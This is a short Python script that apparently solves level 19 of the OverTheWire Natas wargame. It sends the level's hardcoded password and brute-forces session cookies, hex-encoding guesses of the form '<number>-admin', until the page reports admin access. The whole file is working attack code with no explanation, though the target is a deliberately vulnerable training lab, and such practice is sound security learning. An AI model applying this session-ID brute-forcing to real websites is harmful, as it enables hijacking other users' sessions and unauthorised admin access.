import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth('natas19', '8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s')
headers = {'Content-Type': 'application/x-www-form-urlencoded',
           'Cookie' : 'PHPSESSID=0; path=/; HttpOnly'}

actualID=0

url = "http://natas19.natas.labs.overthewire.org/index.php"

while True:
    sessstr = f"{actualID}-admin"
    headers['Cookie'] = f"PHPSESSID={sessstr.encode('utf-8').hex()}"
    
    while True:
        try:
            response=requests.get(url, headers=headers, auth=auth, verify=False)
            break
        except:
            continue
    
    if 'You are an admin' in response.text:
        print(response.text)
        break
    actualID = actualID+1
    print(actualID)
print("done")